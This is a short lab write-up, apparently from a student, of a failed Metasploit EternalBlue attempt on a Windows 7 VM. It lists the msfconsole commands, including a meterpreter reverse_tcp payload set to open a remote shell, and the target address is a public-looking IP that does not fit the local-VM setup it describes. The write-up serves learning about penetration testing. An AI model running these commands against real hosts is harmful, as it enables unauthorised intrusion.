# Mini Project 04: Metasploit Exploit on Windows 7 (Failed – No Session Created)

## Summary

This project aimed to exploit the EternalBlue vulnerability (CVE-2017-0144) on a Windows 7 VM using the Metasploit Framework.  
Although the exploit was launched successfully, **no Meterpreter session was created**, and access was not achieved.

---

## Objective

- Perform a penetration test using Metasploit  
- Exploit a vulnerable SMBv1 service on Windows 7  
- Gain a Meterpreter session using a reverse TCP payload

---

## Environment Setup

- **Attacker Machine:** Kali Linux (VirtualBox)  
- **Victim Machine:** Windows 7 (VirtualBox)  
- **Tool:** Metasploit Framework  
- **Exploit Used:** `windows/smb/ms17_010_eternalblue`  
- **Payload:** `windows/x64/meterpreter/reverse_tcp`

---

## Commands Executed

```bash
msfconsole

use exploit/windows/smb/ms17_010_eternalblue

set RHOSTS 103.127.108.11
set LHOST 10.0.2.15
set LPORT 4444
set PAYLOAD windows/x64/meterpreter/reverse_tcp

exploit

## Result ❌

- Exploit executed, but **no session was created**  
- Message shown: `Exploit completed, but no session was opened.`

---

## Likely Causes

- Target system patched or not truly vulnerable to EternalBlue  
- Antivirus or firewall blocked the reverse connection  
- Incorrect payload architecture selected  
- NAT/VM network settings not properly configured  
- RHOST IP was unreachable or inactive

---

## Vulnerability Recap

- **Name:** EternalBlue  
- **CVE:** CVE-2017-0144  
- **Type:** Remote Code Execution  
- **Target Service:** SMBv1 (TCP Port 445)  
- **Patched by:** MS17-010 Security Update  
- **Used In:** WannaCry, NotPetya
